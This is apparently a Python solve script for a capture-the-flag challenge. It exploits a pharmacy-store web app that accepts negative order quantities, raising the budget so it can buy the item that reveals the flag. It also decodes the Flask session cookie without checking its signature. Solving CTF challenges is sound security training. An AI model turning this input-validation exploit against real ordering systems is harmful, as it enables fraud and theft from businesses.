#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Bodega de farmacia (203.0.113.10:8005)

Vulnerabilidad: el formulario limita `cantidad` en el cliente (min=1, max=99)
pero el servidor acepta enteros negativos. Un pedido con cantidad negativa
resta un costo negativo al presupuesto, es decir, lo aumenta.

  gasa  -50  ->  presupuesto 100 - (-50 * 20) = 1100
  llave   1  ->  presupuesto 1100 - 999      =  101  (llave en bodega)
  GET /      ->  cdm{...}

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import base64
import json
import re
import sys

import requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "203.0.113.10:8005")
FLAG_RE = re.compile(r"[a-z0-9_]*\{[^}]*\}")


def sesion_actual(s: requests.Session) -> dict:
    """Decodifica el payload del cookie de sesion Flask (sin validar firma)."""
    valor = s.cookies.get("session", "")
    payload = valor.split(".")[0] if "." in valor else ""
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))


def pedir(s: requests.Session, item: str, cantidad: str) -> dict:
    r = s.post(f"{BASE}/pedir", data={"item": item, "cantidad": cantidad}, timeout=15)
    r.raise_for_status()
    return {"item": item, "cantidad": cantidad, "status": r.url, "sesion": sesion_actual(s)}


def main() -> int:
    s = requests.Session()
    s.get(f"{BASE}/", timeout=15)
    print(f"[*] sesion inicial: {sesion_actual(s)}")

    for paso in (pedir(s, "gasa", "-50"), pedir(s, "llave", "1")):
        print(f"[*] pedir {paso['item']} x {paso['cantidad']} -> {paso['sesion']}")

    html = s.get(f"{BASE}/", timeout=15).text
    m = FLAG_RE.search(html)
    if not m:
        print("[-] no se encontro la flag")
        return 1
    flag = m.group(0)
    print(f"[+] FLAG: {flag}")

    with open("flag.txt", "w", encoding="utf-8") as fh:
        fh.write(flag + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
